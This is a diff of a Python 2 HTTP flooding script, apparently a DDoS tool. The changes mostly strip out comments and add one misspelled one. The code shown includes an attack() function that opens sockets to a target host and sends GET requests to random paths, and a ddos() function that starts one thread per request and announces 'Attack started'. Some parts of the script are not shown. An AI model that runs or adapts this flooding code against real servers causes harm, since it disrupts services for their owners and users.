@@ -13,12 +13,11 @@ num_requests = 0
 
 
 
-# Create a shared variable for thread counts
 thread_num = 0
 thread_num_mutex = threading.Lock()
 
 
-# Print thread status
+
 def status():
     global thread_num
     thread_num_mutex.acquire(True)
@@ -29,23 +28,20 @@ def status():
     thread_num_mutex.release()
 
 
-# Generate URL Path
 def urli_path():
     msg = str(string.letters + string.digits + string.punctuation)
     data = "".join(random.sample(msg, 5))
     return data
 
 
-# Perform the request
 def attack():
     status()
     url_path = urli_path()
 
-    # Create a raw socket
+    # Creating a soccket
     dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     try:
-        # Open the connection on that raw socket
         dos.connect((ip, port))
 
         dos.send("GET /%s HTTP/1.1\nHost: %s \n\n" % (url_path, host))
@@ -76,7 +72,7 @@ def ddos():
     print "[^] Attack started on " + host + " (" + ip + ") || Port: " + str(port) + " || # Requests: " + str(num_requests)
     time.sleep(3)
 
-# Spawn a thread per request
+
     all_threads = []
     for i in xrange(num_requests):
         t1 = threading.Thread(target=attack)
